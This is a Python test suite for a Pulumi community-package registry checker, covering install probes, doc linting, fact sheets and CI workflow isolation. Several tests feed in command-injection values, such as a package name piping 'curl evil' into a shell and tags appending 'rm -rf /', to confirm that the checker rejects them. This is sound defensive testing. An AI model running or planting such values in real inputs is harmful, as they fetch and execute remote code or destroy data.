from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any
from unittest.mock import patch

import yaml

sys.path.insert(0, str(Path(__file__).parent))
import cli  # noqa: E402
import comment_commands  # noqa: E402
import doc_lint  # noqa: E402
import fact_sheet  # noqa: E402
import github_api  # noqa: E402
import package_list  # noqa: E402
import resourcedocsgen  # noqa: E402
import sdk_install_probe  # noqa: E402
import verify_entry  # noqa: E402
from models import DocFile, DocFinding, Entry, InstallResult, Manifest, Version, provider_name  # noqa: E402

SCHEMA: dict[str, Any] = {
    "name": "time",
    "pluginDownloadURL": "https://get.example.com/time",
    "language": {
        "nodejs": {"packageName": "@pulumiverse/time"},
        "python": {"packageName": "pulumiverse_time"},
        "go": {"importBasePath": "github.com/pulumiverse/pulumi-time/sdk/go/time"},
    },
}


def _rejected_probe(package_name: str) -> InstallResult:
    schema = {**SCHEMA, "language": {"nodejs": {"packageName": package_name}}}
    return next(r for r in sdk_install_probe.probe_installs("time", "v0.1.1", schema)
                if r.language == "nodejs")


class InstallProbeTests(unittest.TestCase):
    def setUp(self) -> None:
        self.calls: list[list[str]] = []
        self._real_run = sdk_install_probe._run

        def fake(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            self.calls.append(cmd)
            return True, ""

        sdk_install_probe._run = fake

    def tearDown(self) -> None:
        sdk_install_probe._run = self._real_run

    def test_builds_safe_commands_from_schema(self) -> None:
        commands = {r.language: r.command for r in sdk_install_probe.probe_installs("time", "v0.1.1", SCHEMA)}
        self.assertEqual(commands["plugin"], "pulumi plugin install resource time v0.1.1")
        self.assertEqual(commands["nodejs"], "npm install @pulumiverse/time@0.1.1")
        self.assertEqual(commands["python"], "pip download pulumiverse_time==0.1.1")
        self.assertIn("go get github.com/pulumiverse/pulumi-time/sdk/go/time@v0.1.1", commands["go"])
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("-- @pulumiverse/time@0.1.1" in c for c in flat))  # passed as argv, never a shell
        self.assertTrue(any("--server https://get.example.com/time" in c for c in flat))

    def test_rejects_injected_identifiers_without_executing(self) -> None:
        evil = {**SCHEMA, "language": {**SCHEMA["language"], "nodejs": {"packageName": "foo; curl evil|sh"}}}
        results = {r.language: r.result for r in sdk_install_probe.probe_installs("time; rm -rf /", "v0.1.1", evil)}
        self.assertEqual(results["plugin"], "rejected")
        self.assertEqual(results["nodejs"], "rejected")
        self.assertFalse(any(c and c[0] in ("npm", "pulumi") for c in self.calls))

    def test_a_rejection_names_the_value_and_what_is_allowed(self) -> None:
        node = _rejected_probe("foo; curl evil|sh")
        self.assertIn("foo; curl evil", node.command)
        self.assertIn("nodejs packageName", node.error)
        self.assertIn("letters, digits", node.error)

    def test_a_rejection_names_the_schema_key_it_read(self) -> None:
        schema = {**SCHEMA, "language": {"go": {"importBasePath": "a b"},
                                         "python": {"packageName": "a b"}}}
        kinds = {r.language: r.error for r in sdk_install_probe.probe_installs("time", "v0.1.1", schema)}
        self.assertIn("importBasePath", kinds["go"])
        self.assertIn("packageName", kinds["python"])

    def test_a_derived_python_name_says_where_it_came_from(self) -> None:
        schema = {"name": "a b", "language": {"python": {}}}
        python = next(r for r in sdk_install_probe.probe_installs("time", "v0.1.1", schema)
                      if r.language == "python")
        self.assertIn("taken from the schema name", python.error)

    def test_a_pipe_in_the_value_cannot_break_the_table_row(self) -> None:
        installs = [_rejected_probe("foo|sh")]
        row = next(line for line in fact_sheet.render(_manifest(installs=installs)).splitlines()
                   if "nodejs SDK" in line)
        self.assertEqual(len(re.findall(r"(?<!\\)\|", row)), 4)
        self.assertIn(r"\|", row)

    def test_a_backtick_in_the_value_cannot_break_the_code_span(self) -> None:
        rejected = _rejected_probe("foo`sh")
        self.assertNotIn("`", rejected.command)
        self.assertEqual(rejected.error.count("`"), 2)

    def test_an_enormous_value_is_bounded(self) -> None:
        rejected = _rejected_probe("!" * 5000)
        self.assertLess(len(rejected.command), 200)
        self.assertLess(len(rejected.error), 600)

    def test_a_rejected_tag_says_it_is_the_tag(self) -> None:
        rejected = sdk_install_probe.probe_installs("time", "v0.1.1 && rm -rf /", SCHEMA)
        self.assertEqual([r.result for r in rejected], ["rejected"])
        self.assertIn("release tag", rejected[0].error)

    def test_github_scheme_plugin_url_is_passed_as_server(self) -> None:
        schema = {**SCHEMA, "pluginDownloadURL": "github://api.github.com/o/r"}
        list(sdk_install_probe.probe_installs("time", "v0.1.1", schema))
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("--server github://api.github.com/o/r" in c for c in flat))

    def test_python_uses_pulumi_underscore_when_advertised_without_name(self) -> None:
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", {"name": "thoth", "language": {"python": {}}})
        self.assertEqual(next(r for r in results if r.language == "python").command, "pip download pulumi_thoth==1.0.0")

    def test_unadvertised_sdks_are_not_probed(self) -> None:
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", {"name": "thoth", "language": {}})
        self.assertEqual({r.language for r in results}, {"plugin"})


class PythonResolveTests(unittest.TestCase):
    def setUp(self) -> None:
        self._run, self._exists = sdk_install_probe._run, sdk_install_probe._pypi_version_exists

        def failing_run(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            return False, "ERROR: No matching distribution"

        sdk_install_probe._run = failing_run

    def tearDown(self) -> None:
        sdk_install_probe._run = self._run
        sdk_install_probe._pypi_version_exists = self._exists

    def test_sdist_only_resolves_via_metadata(self) -> None:
        def exists(package: str, version: str) -> bool:
            return True

        sdk_install_probe._pypi_version_exists = exists
        self.assertEqual(sdk_install_probe._python_resolves("pkg", "1.0.0"), (True, ""))

    def test_missing_package_still_fails(self) -> None:
        def missing(package: str, version: str) -> bool:
            return False

        sdk_install_probe._pypi_version_exists = missing
        ok, err = sdk_install_probe._python_resolves("pkg", "1.0.0")
        self.assertFalse(ok)
        self.assertIn("No matching distribution", err)


class CliNoticeTests(unittest.TestCase):
    def test_rejection_sheet_lists_offending_files(self) -> None:
        out = cli._rejection_sheet(["themes/x.md", "sdk/y.go"])
        self.assertIn("❌", out)
        self.assertIn("Not ready", out)
        self.assertIn("themes/x.md", out)

    def test_nothing_to_check_sheet(self) -> None:
        self.assertIn("Nothing to check", cli._nothing_to_check_sheet())

    def test_preview_reply_first_party_skips_build(self) -> None:
        _, comment, should_build = comment_commands._preview_reply(first_party=True)
        self.assertEqual(should_build, "false")
        self.assertIn("automatically", comment)

    def test_preview_reply_fork_builds(self) -> None:
        reaction, _, should_build = comment_commands._preview_reply(first_party=False)
        self.assertEqual(should_build, "true")
        self.assertEqual(reaction, "+1")

    def test_preview_failure_comment_links_the_run(self) -> None:
        posted: list[tuple[int, str]] = []
        real = github_api.post_comment

        def fake(pr: int, body: str) -> None:
            posted.append((pr, body))

        github_api.post_comment = fake
        os.environ.update(PR="11661", GITHUB_SERVER_URL="https://github.com",
                          GITHUB_REPOSITORY="pulumi/registry", GITHUB_RUN_ID="999")
        os.environ.pop("COMMENT_ID", None)
        try:
            comment_commands.preview_failed()
        finally:
            github_api.post_comment = real
        self.assertEqual(posted[0][0], 11661)
        self.assertIn("actions/runs/999", posted[0][1])
        self.assertIn("failed", posted[0][1])

    def test_package_list_and_publisher_allowlist_are_permitted(self) -> None:
        changed = ["community-packages/package-list.json",
                   "tools/resourcedocsgen/pkg/publishers/publisher-names.json"]
        self.assertEqual(package_list.files_outside_allowlist(changed), [])

    def test_generated_files_are_offending(self) -> None:
        changed = ["community-packages/package-list.json",
                   "themes/default/content/registry/packages/thoth/_index.md",
                   "themes/default/data/registry/packages/thoth.yaml"]
        self.assertEqual(package_list.files_outside_allowlist(changed),
                         ["themes/default/content/registry/packages/thoth/_index.md",
                          "themes/default/data/registry/packages/thoth.yaml"])


class DocLintTests(unittest.TestCase):
    def test_flags_broken_refs_and_ignores_absolute(self) -> None:
        issues = doc_lint.find_issues(
            "![logo](./logo.png)\n<a href=\"./page\">y</a>\nsee [config](./x.md)\n"
            "[ok](https://e.com)\n![ok](https://e.com/y.png)\n")
        self.assertEqual({i.line for i in issues}, {1, 2, 3})
        self.assertEqual({i.kind for i in issues}, {"relative-image", "raw-relative-link", "md-suffixed-link"})

    def test_clean_doc(self) -> None:
        self.assertEqual(doc_lint.find_issues("[x](https://y)\n![a](https://y/z.png)\n"), [])

    def test_uppercase_scheme_is_absolute(self) -> None:
        self.assertEqual(doc_lint.find_issues('<img src="HTTPS://e.com/a.png">\n'), [])


class PackageListTests(unittest.TestCase):
    def test_added_entries(self) -> None:
        base = '{"include":[{"repoSlug":"a/b","schemaFile":"s"}]}'
        grown = '{"include":[{"repoSlug":"a/b","schemaFile":"s"},{"repoSlug":"c/d","schemaFile":"t"}]}'
        self.assertEqual(package_list.added_entries(base, base), [])
        self.assertEqual([e.repoSlug for e in package_list.added_entries(base, grown)], ["c/d"])
        self.assertEqual([e.repoSlug for e in package_list.added_entries("[]", '[{"repoSlug":"c/d","schemaFile":"t"}]')],
                         ["c/d"])


class VerifyTests(unittest.TestCase):
    def test_provider_name_prefers_schema_then_repo_suffix(self) -> None:
        self.assertEqual(provider_name("x/pulumi-thoth", {"name": "thoth"}), "thoth")
        self.assertEqual(provider_name("x/pulumi-thoth", {}), "thoth")
        self.assertEqual(provider_name("x/pulumi-provider-dex", {}), "provider-dex")

    def test_unverifiable_entry_is_red_with_reason(self) -> None:
        manifest = verify_entry._unverifiable(Entry("x/pulumi-demo", "s.json"), "no release")
        self.assertFalse(manifest.green)
        self.assertEqual(manifest.error, "no release")
        self.assertEqual(manifest.providerName, "demo")

    def test_publisher_known_only_when_listed(self) -> None:
        names = {"Aten Security": "atensecurity", "aptible": "aptible"}
        self.assertTrue(verify_entry._publisher_known("Aten Security", names))
        self.assertFalse(verify_entry._publisher_known("Aten Security", {"aptible": "aptible"}))

    def test_absent_publisher_is_not_flagged(self) -> None:
        self.assertTrue(verify_entry._publisher_known("", {}))

    def test_schema_version_matches_tag_without_prefix(self) -> None:
        self.assertTrue(verify_entry._schema_version_matches("0.4.5", "v0.4.5"))
        self.assertTrue(verify_entry._schema_version_matches("0.4.5", "0.4.5"))

    def test_placeholder_schema_version_does_not_match(self) -> None:
        self.assertFalse(verify_entry._schema_version_matches("0.0.0", "v0.4.5"))
        self.assertFalse(verify_entry._schema_version_matches("0.0.0-dev", "v1.3.0"))

    def test_absent_schema_version_is_not_flagged(self) -> None:
        self.assertTrue(verify_entry._schema_version_matches("", "v1.3.0"))


def _manifest(green: bool = True, warnings: bool = False, findings: list[DocFinding] | None = None,
              installs: list[InstallResult] | None = None, docs: list[DocFile] | None = None,
              publisher: str = "", publisherKnown: bool = True, generation: bool = True,
              generationError: str = "", indexPresent: bool = True,
              schemaVersion: str = "", schemaVersionMatches: bool = True) -> Manifest:
    return Manifest("x/pulumi-demo", "s.json", "demo", Version("v1.0.0", "0" * 40), "x",
                    installs or [], findings or [], green=green, warnings=warnings,
                    generation=generation, docs=docs or [], generationError=generationError,
                    indexPresent=indexPresent, publisher=publisher, publisherKnown=publisherKnown,
                    schemaVersion=schemaVersion, schemaVersionMatches=schemaVersionMatches)


class FactSheetTests(unittest.TestCase):
    def test_green_render_with_docs_and_findings(self) -> None:
        out = fact_sheet.render(_manifest(
            findings=[DocFinding(12, "relative-image", "![a](./b.png)")],
            docs=[DocFile("docs/_index.md", 3, "# Title\n```go\nx\n```\n")]))
        self.assertIn("✅", out.splitlines()[0])
        self.assertIn("Doc-lint: 1 finding(s)", out)
        self.assertIn("docs/_index.md:12", out)
        self.assertIn("/blob/" + "0" * 40 + "/docs/_index.md", out)
        self.assertIn("# Title", out)

    def test_unknown_publisher_is_flagged_in_the_sheet(self) -> None:
        out = fact_sheet.render(_manifest(warnings=True, publisher="Aten Security", publisherKnown=False))
        self.assertIn("publisher listed", out)
        self.assertIn("⚠️", out)
        self.assertIn("no entry for `Aten Security`", out)

    def test_known_publisher_shows_row_without_warning_note(self) -> None:
        out = fact_sheet.render(_manifest(publisher="Aten Security", publisherKnown=True))
        self.assertIn("publisher listed", out)
        self.assertNotIn("no entry for", out)

    def test_mismatched_schema_version_is_flagged_in_the_sheet(self) -> None:
        out = fact_sheet.render(_manifest(green=False, schemaVersion="0.0.0", schemaVersionMatches=False))
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("schema version", out)
        self.assertIn("declares version `0.0.0`", out)

    def test_matching_schema_version_shows_row_without_note(self) -> None:
        out = fact_sheet.render(_manifest(schemaVersion="1.0.0"))
        self.assertIn("schema version", out)
        self.assertNotIn("declares version", out)

    def test_a_rejection_reason_reaches_the_sheet(self) -> None:
        out = fact_sheet.render(_manifest(installs=[_rejected_probe("a b")]))
        self.assertIn("**nodejs** 🚫", out)
        self.assertIn("The schema gives the nodejs packageName as `'a b'`", out)

    def test_red_render_with_install_failure(self) -> None:
        out = fact_sheet.render(_manifest(
            green=False,
            installs=[InstallResult("python", "pip download x==1", "fail", error="No matching distribution")]))
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("/check", out)
        self.assertIn("pip download x==1", out)
        self.assertIn("No matching distribution", out)
        self.assertIn("<details>", out)

    def test_generation_failure_shows_the_generator_output(self) -> None:
        out = fact_sheet.render(_manifest(
            green=False, generation=False,
            generationError="finding remote file at .../docs/_index.md: 404 Not Found"))
        self.assertIn("docs generate failed", out)
        self.assertIn("404 Not Found", out)

    def test_generation_failure_without_output_adds_no_empty_block(self) -> None:
        out = fact_sheet.render(_manifest(green=False, generation=False))
        self.assertNotIn("docs generate failed", out)

    def test_missing_index_is_reported_instead_of_a_clean_doc_lint(self) -> None:
        out = fact_sheet.render(_manifest(green=False, generation=False, indexPresent=False))
        self.assertIn("no `docs/_index.md`", out)
        self.assertNotIn("Doc-lint** ✅ clean", out)

    def test_doc_fence_outgrows_backticks(self) -> None:
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("no ticks"), "```")
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("```go\nx\n```"), "````")

    def test_warning_render_is_yellow(self) -> None:
        out = fact_sheet.render(_manifest(
            green=True, warnings=True,
            installs=[InstallResult("nodejs", "npm install x@1", "fail", error="404")]))
        self.assertIn("🟡", out.splitlines()[0])
        self.assertIn("review the warnings", out.lower())
        self.assertNotIn("Ready for approval", out)

    def test_error_render_is_compact_and_red(self) -> None:
        manifest = _manifest(green=False)
        manifest.error = "No published GitHub release."
        out = fact_sheet.render(manifest)
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("No published GitHub release.", out)
        self.assertNotIn("docs generate", out)


class SweepTests(unittest.TestCase):
    def _sweep(self, files: list[str] | None = None,
               already: bool = False) -> list[tuple[str, dict[str, str]]]:
        dispatched: list[tuple[str, dict[str, str]]] = []
        with patch.object(github_api, "open_pull_requests",
                          lambda: [{"number": 7, "head": {"sha": "a" * 40}}]), \
             patch.object(github_api, "pull_request_files",
                          lambda pr: files if files is not None else [comment_commands.PACKAGE_LIST]), \
             patch.object(github_api, "dispatch_exists", lambda w, label: already), \
             patch.object(github_api, "dispatch_workflow",
                          lambda w, inputs: dispatched.append((w, inputs))):
            comment_commands.sweep()
        return dispatched

    def test_dispatches_a_check_for_a_package_pr(self) -> None:
        self.assertEqual(self._sweep(),
                         [(comment_commands.CHECK_WORKFLOW, {"pr": "7", "head": "a" * 12})])

    def test_skips_a_pr_that_does_not_touch_the_package_list(self) -> None:
        self.assertEqual(self._sweep(files=["README.md"]), [])

    def test_dispatches_each_head_once(self) -> None:
        self.assertEqual(self._sweep(already=True), [])

    def test_run_label_is_stable_per_head(self) -> None:
        self.assertEqual(github_api.dispatch_run_label(7, "a" * 40),
                         "Community package check · PR #7 · " + "a" * 12)


class DispatchLabelTests(unittest.TestCase):

    def _dispatched(self) -> dict[str, str]:
        sent: list[dict[str, str]] = []
        with patch.object(github_api, "dispatch_workflow", lambda w, inputs: sent.append(inputs)):
            github_api.dispatch_check("w.yml", 7, "a" * 40)
        return sent[0]

    def test_the_workflow_names_its_run_exactly_as_the_sweep_looks_it_up(self) -> None:
        workflow = Path(__file__).resolve().parents[3] / ".github/workflows/community-package-check.yml"
        template = str(yaml.safe_load(workflow.read_text())["run-name"])
        inputs = self._dispatched()
        for field, value in inputs.items():
            template = template.replace("${{ inputs.%s }}" % field, value)
        self.assertEqual(template, github_api.dispatch_run_label(7, "a" * 40))

    def test_a_run_is_matched_by_its_display_title(self) -> None:
        label = github_api.dispatch_run_label(7, "a" * 40)
        runs = [{"name": "Community package check", "display_title": label,
                 "created_at": "2020-01-01T00:00:00Z"}]
        with patch.object(github_api, "_dispatched_runs", lambda w: runs):
            self.assertTrue(github_api.dispatch_exists("w.yml", label))
            self.assertIsNotNone(github_api.minutes_since_dispatch("w.yml", 7))

    def test_a_run_for_another_pr_is_not_matched(self) -> None:
        runs = [{"display_title": github_api.dispatch_run_label(8, "a" * 40)}]
        with patch.object(github_api, "_dispatched_runs", lambda w: runs):
            self.assertFalse(github_api.dispatch_exists("w.yml", github_api.dispatch_run_label(7, "a" * 40)))
            self.assertIsNone(github_api.minutes_since_dispatch("w.yml", 7))


class PullRequestFilesTests(unittest.TestCase):
    def test_every_page_is_read(self) -> None:
        pages = {1: [{"filename": f"f{i}"} for i in range(100)],
                 2: [{"filename": "last"}]}

        def fake(path: str) -> list[dict[str, Any]]:
            return pages[int(path.rsplit("page=", 1)[1])]

        with patch.object(github_api, "repo", lambda: "x/y"), \
             patch.object(github_api, "request", fake):
            self.assertEqual(len(github_api.pull_request_files(7)), 101)


class CommandInvocationTests(unittest.TestCase):
    def test_a_bare_command_invokes(self) -> None:
        self.assertTrue(comment_commands._invokes("/check", "/check"))

    def test_a_command_on_its_own_line_invokes(self) -> None:
        self.assertTrue(comment_commands._invokes("- [x] SDKs published\n\n/check\n", "/check"))

    def test_arguments_after_the_command_invoke(self) -> None:
        self.assertTrue(comment_commands._invokes("/check please", "/check"))

    def test_the_fact_sheet_mentioning_the_command_does_not_invoke(self) -> None:
        self.assertFalse(comment_commands._invokes(
            "**Not ready.** Fix upstream, then comment `/check` to re-run.", "/check"))

    def test_a_fenced_command_does_not_invoke(self) -> None:
        self.assertFalse(comment_commands._invokes("Run this:\n```\n/check\n```\n", "/check"))

    def test_a_quoted_command_does_not_invoke(self) -> None:
        self.assertFalse(comment_commands._invokes("> /check\n\nI already tried that.", "/check"))


class CheckCommandTests(unittest.TestCase):
    def _run(self, minutes_dispatch: int | None) -> list[dict[str, str]]:
        dispatched: list[dict[str, str]] = []
        os.environ.update(PR="7", COMMENT_ID="1", COMMENTER="ren", ASSOC="NONE", COMMENT_BODY="/check")
        with patch.object(github_api, "pull_request_head", lambda pr: ("ren", "b" * 40)), \
             patch.object(github_api, "minutes_since_dispatch", lambda w, pr: minutes_dispatch), \
             patch.object(github_api, "add_reaction", lambda *a: None), \
             patch.object(github_api, "post_comment", lambda *a: None), \
             patch.object(github_api, "fact_sheet_comment", lambda pr: None), \
             patch.object(github_api, "dispatch_workflow",
                          lambda w, inputs: dispatched.append(inputs)):
            comment_commands.check_command()
        for name in ("PR", "COMMENT_ID", "COMMENTER", "ASSOC", "COMMENT_BODY"):
            del os.environ[name]
        return dispatched

    def test_author_dispatches_a_check(self) -> None:
        self.assertEqual(self._run(None), [{"pr": "7", "head": "b" * 12}])

    def test_a_recent_dispatch_rate_limits(self) -> None:
        self.assertEqual(self._run(2), [])

    def test_an_old_dispatch_does_not_rate_limit(self) -> None:
        self.assertEqual(len(self._run(90)), 1)


class CheckAllowlistTests(unittest.TestCase):
    def _check(self, changed: str) -> tuple[int, str]:
        with tempfile.TemporaryDirectory() as scratch:
            listing = Path(scratch) / "changed.txt"
            listing.write_text(changed)
            code = cli._check(argparse.Namespace(diff="origin/master", out=scratch,
                                                 changed_files=str(listing)))
            sheet = Path(scratch) / "000.factsheet.md"
            return code, sheet.read_text() if sheet.exists() else ""

    def test_the_check_refuses_a_file_the_gate_would_have_refused(self) -> None:
        code, sheet = self._check("community-packages/package-list.json\nREADME.md\n")
        self.assertEqual(code, 1)
        self.assertIn("outside the community package allowlist", sheet)
        self.assertIn("README.md", sheet)


def _community_workflows() -> list[Path]:
    return sorted((Path(__file__).resolve().parents[3] / ".github/workflows").glob("community-package-*.yml"))


_SECRET = re.compile(r"secrets\.|ESC_ACTION|esc-action|ANTHROPIC_API_KEY|PULUMI_BOT_TOKEN|id-token: *write")
_RUNS_CODE = re.compile(
    r"cli\.py check(?![-\w])|npm (install|ci)|pip (install|download)|go get|go mod download|pulumi plugin install")


class SecretCodeSeparationTests(unittest.TestCase):

    def test_no_step_holds_a_token_beside_contributor_code(self) -> None:
        for workflow in _community_workflows():
            for job in yaml.safe_load(workflow.read_text())["jobs"].values():
                for step in job.get("steps", []):
                    if "GITHUB_TOKEN" not in (step.get("env") or {}):
                        continue
                    self.assertNotRegex(step.get("run", ""), _RUNS_CODE,
                                        f"{workflow.name}: step '{step.get('name')}' holds a token and runs code")

    def test_no_workflow_mixes_secrets_with_contributor_code(self) -> None:
        workflows = _community_workflows()
        self.assertTrue(workflows, "no community-package workflows found")
        for workflow in workflows:
            text, name = workflow.read_text(), workflow.name
            holds_secret = bool(_SECRET.search(text))
            self.assertFalse(holds_secret and _RUNS_CODE.search(text), f"{name}: secret shares a job with code")
            self.assertNotIn("pull_request_target", text, name)
            if holds_secret:
                self.assertNotRegex(text, r"ref:.*\.head\.", f"{name}: secret job checks out the PR head")


def _steps(job: dict[str, Any]) -> list[dict[str, Any]]:
    return list(job.get("steps", []))


def _job_writes(job: dict[str, Any]) -> bool:
    permissions = job.get("permissions") or {}
    return any(value == "write" for value in permissions.values())


class ContributorCodeIsolationTests(unittest.TestCase):

    def _jobs_running_code(self) -> list[tuple[str, str, dict[str, Any]]]:
        found = []
        for workflow in _community_workflows():
            for name, job in yaml.safe_load(workflow.read_text())["jobs"].items():
                if any(_RUNS_CODE.search(step.get("run", "")) for step in _steps(job)):
                    found.append((workflow.name, name, job))
        return found

    def test_a_job_that_runs_a_package_exists(self) -> None:
        self.assertTrue(self._jobs_running_code())

    def test_a_job_that_runs_a_package_cannot_write(self) -> None:
        for workflow, name, job in self._jobs_running_code():
            self.assertFalse(_job_writes(job), f"{workflow}: job '{name}' runs a package and can write")


class TokenReachTests(unittest.TestCase):

    def _check_job(self) -> dict[str, Any]:
        workflow = Path(__file__).resolve().parents[3] / ".github/workflows/community-package-check.yml"
        return dict(yaml.safe_load(workflow.read_text())["jobs"]["check"])

    def test_the_job_holds_no_token_for_every_step(self) -> None:
        self.assertNotIn("GITHUB_TOKEN", self._check_job().get("env") or {})

    def test_the_checkout_leaves_no_credential_behind(self) -> None:
        checkouts = [s for s in _steps(self._check_job()) if "actions/checkout" in s.get("uses", "")]
        self.assertTrue(checkouts)
        for step in checkouts:
            self.assertIs(step["with"]["persist-credentials"], False)

    def test_one_step_holds_the_token_and_it_is_the_gate(self) -> None:
        holders = [s["name"] for s in _steps(self._check_job())
                   if "GITHUB_TOKEN" in (s.get("env") or {})]
        self.assertEqual(len(holders), 1)
        self.assertIn("refuse", holders[0])


class AllowlistGateTests(unittest.TestCase):
    def _fetch(self, changed: list[str]) -> tuple[int, list[str], str]:
        written: list[str] = []

        def fetched(slug: str, path: str, ref: str) -> str:
            written.append(path)
            return "{}"

        with tempfile.TemporaryDirectory() as scratch:
            root = Path(scratch)
            for path in package_list.ALLOWED_PATHS:
                (root / path).parent.mkdir(parents=True, exist_ok=True)
            cwd = os.getcwd()
            os.chdir(root)
            try:
                args = argparse.Namespace(pr=7, changed_files="c.txt", out=".")
                with patch.object(github_api, "pull_request_files", lambda pr: changed), \
                     patch.object(github_api, "repo", lambda: "x/y"), \
                     patch.object(github_api, "pull_request",
                                  lambda pr: {"head": {"sha": "c" * 40}}), \
                     patch.object(github_api, "file_content_at", fetched):
                    code = cli.run_fetch_pr(args)
                sheet = Path("000.factsheet.md")
                return code, written, sheet.read_text() if sheet.exists() else ""
            finally:
                os.chdir(cwd)

    def test_an_allowlisted_pull_request_passes_the_gate(self) -> None:
        code, written, sheet = self._fetch([str(package_list.PATH)])
        self.assertEqual(code, 0)
        self.assertEqual(len(written), len(package_list.ALLOWED_PATHS))
        self.assertEqual(sheet, "")

    def test_any_other_file_stops_before_the_package_is_touched(self) -> None:
        code, written, sheet = self._fetch([str(package_list.PATH), ".github/workflows/push.yml"])
        self.assertEqual(code, 1)
        self.assertEqual(written, [])
        self.assertIn("outside the community package allowlist", sheet)
        self.assertIn("push.yml", sheet)


class CheckStepOrderTests(unittest.TestCase):

    def _run_index(self, needle: str) -> int:
        workflow = Path(__file__).resolve().parents[3] / ".github/workflows/community-package-check.yml"
        steps = _steps(yaml.safe_load(workflow.read_text())["jobs"]["check"])
        return next(i for i, step in enumerate(steps) if needle in step.get("run", ""))

    def test_the_pull_requests_files_arrive_before_the_check_reads_them(self) -> None:
        self.assertLess(self._run_index("cli.py fetch-pr"), self._run_index("cli.py check"))

    def test_the_gate_runs_before_the_package_does(self) -> None:
        steps = _steps(yaml.safe_load(
            (Path(__file__).resolve().parents[3]
             / ".github/workflows/community-package-check.yml").read_text())["jobs"]["check"])
        gate = next(i for i, s in enumerate(steps) if "GITHUB_TOKEN" in (s.get("env") or {}))
        package = next(i for i, s in enumerate(steps) if "cli.py check" in s.get("run", ""))
        self.assertLess(gate, package)


class VerifyPackageYamlTests(unittest.TestCase):
    def _tree(self, root: Path, name: str, data: dict[str, Any], index: str | None = "# Stripe\n") -> Path:
        yaml_dir = root / "themes/default/data/registry/packages"
        yaml_dir.mkdir(parents=True, exist_ok=True)
        yaml_path = yaml_dir / f"{name}.yaml"
        yaml_path.write_text(json.dumps(data))
        if index is not None:
            index_dir = root / "themes/default/content/registry/packages" / name
            index_dir.mkdir(parents=True, exist_ok=True)
            (index_dir / "_index.md").write_text(index)
        return yaml_path

    def _verify(self, data: dict[str, Any], index: str | None = "# Stripe\n",
                publishers: dict[str, str] | None = None) -> Manifest:
        names = {"stripe": "stripe"} if publishers is None else publishers
        with tempfile.TemporaryDirectory() as scratch:
            root = Path(scratch)
            yaml_path = self._tree(root, "stripe", data, index)
            with patch.object(verify_entry, "_load_publisher_names", return_value=names):
                return verify_entry.verify_package_yaml(yaml_path, root)

    def test_registered_publisher_is_green(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"})
        self.assertTrue(manifest.green)
        self.assertEqual(manifest.version.tag, "0.4.0")

    def test_a_prerelease_version_is_accepted(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.3.0-beta.4"})
        self.assertTrue(manifest.green)

    def test_unregistered_publisher_blocks(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"}, publishers={})
        self.assertFalse(manifest.green)
        self.assertFalse(manifest.publisherKnown)

    def test_missing_version_is_unverifiable(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe"})
        self.assertFalse(manifest.green)
        self.assertIn("no `version`", manifest.error)

    def test_missing_index_blocks_and_says_why(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"}, index=None)
        self.assertFalse(manifest.green)
        self.assertIn("landing page", manifest.error)

    def test_doc_lint_findings_are_advisory(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"},
                                index="# Stripe\n\n![diagram](./img/arch.png)\n")
        self.assertTrue(manifest.green)
        self.assertTrue(manifest.warnings)
        self.assertTrue(manifest.docLint)

    def test_delisted_package_is_skipped(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "DEPRECATED", "version": "0.4.0"},
                                index=None, publishers={})
        self.assertTrue(manifest.delisted)
        self.assertTrue(manifest.green)

    def test_no_network_calls(self) -> None:
        import urllib.request
        with patch.object(urllib.request, "urlopen", side_effect=AssertionError("network call")):
            manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"})
        self.assertTrue(manifest.green)

    def test_sheet_renders_without_a_commit(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"}, publishers={})
        sheet = fact_sheet.render(manifest)
        self.assertIn("no entry for `stripe`", sheet)
        self.assertNotIn("/commit/", sheet)


class ChangedPackageYamlTests(unittest.TestCase):
    def _changed(self, paths: list[str]) -> list[Path]:
        completed = type("R", (), {"stdout": "\n".join(paths)})()
        with patch("cli.subprocess.run", return_value=completed):
            return cli._changed_package_yamls("origin/master")

    def test_selects_only_package_yamls(self) -> None:
        changed = self._changed([
            "themes/default/data/registry/packages/stripe.yaml",
            "themes/default/content/registry/packages/stripe/_index.md",
            "themes/default/data/registry/package_versions/stripe.yaml",
            "community-packages/package-list.json",
        ])
        self.assertEqual(changed, [Path("themes/default/data/registry/packages/stripe.yaml")])

    def test_no_package_change_is_empty(self) -> None:
        self.assertEqual(self._changed(["README.md"]), [])


if __name__ == "__main__":
    unittest.main()


class ProviderNameFlagTests(unittest.TestCase):

    def _args(self) -> list[str]:
        seen: list[list[str]] = []

        class Done:
            returncode = 0
            stdout = ""
            stderr = ""

        def fake(args: list[str], **kwargs: Any) -> Done:
            seen.append(args)
            return Done()

        with patch.object(subprocess, "run", fake):
            resourcedocsgen.generate_metadata("incsteps/pulumi-provider-multipass", "schema.json",
                                              "v0.1.0", "multipass")
        return seen[0]

    def test_the_schema_name_is_passed_not_the_repo_name(self) -> None:
        args = self._args()
        self.assertIn("--providerName", args)
        self.assertEqual(args[args.index("--providerName") + 1], "multipass")

    def test_a_repo_named_for_neither_still_generates(self) -> None:
        self.assertNotIn("provider-multipass", self._args())


